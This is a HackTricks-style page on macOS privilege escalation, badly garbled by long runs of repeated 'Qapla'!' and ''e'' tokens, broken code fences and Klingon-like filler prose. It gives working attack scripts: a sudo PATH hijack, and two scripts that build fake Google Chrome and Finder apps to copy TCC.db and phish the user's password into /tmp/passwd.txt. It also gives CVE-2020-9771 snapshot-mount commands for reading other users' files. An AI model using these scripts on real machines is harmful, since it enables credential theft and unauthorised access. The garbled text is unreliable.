# macOS Privilege Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:

{% content-ref url="macos-security-protections/macos-tcc/" %}
[macos-tcc](macos-security-protections/macos-tcc/)
{% endcontent-ref %}

## User Interaction

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/#sudo-hijacking).

However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qapla'! Qap
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}

{% tab title="Finder Impersonation" %}
Some suggestions:

* **Finder** **jatlh** **Dock** **ghItlh** **ghItlh** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{% endtab %}
{% endtabs %}

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

**ghItlhvam** [**ghItlhvam**](https://theevilbit.github.io/posts/cve\_2020\_9771/) **tlhInganpu'** **ghItlhvam**.

## **Qagh** Information

**ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam**:

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhInganpu' AWS hacking</strong></a><strong>!</strong></summary>

**HackTricks** **ghItlhvam** **ghItlhvam** **ghItlhvam**:

* **ghItlhvam** **ghItlhvam** **HackTricks** **ghItlhvam** **PDF** **ghItlhvam** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* **ghItlhvam** [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **ghItlhvam** [**The PEASS Family**](https://opensea.io/collection/the-peass-family), **ghItlhvam** [**NFTs**](https://opensea.io/collection/the-peass-family) **ghItlhvam**
* **ghItlhvam** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group**](https://t.me/peass) **ghItlhvam** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ghItlhvam** **ghItlhvam** **ghItlhvam** **HackTricks** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos**.

</details>
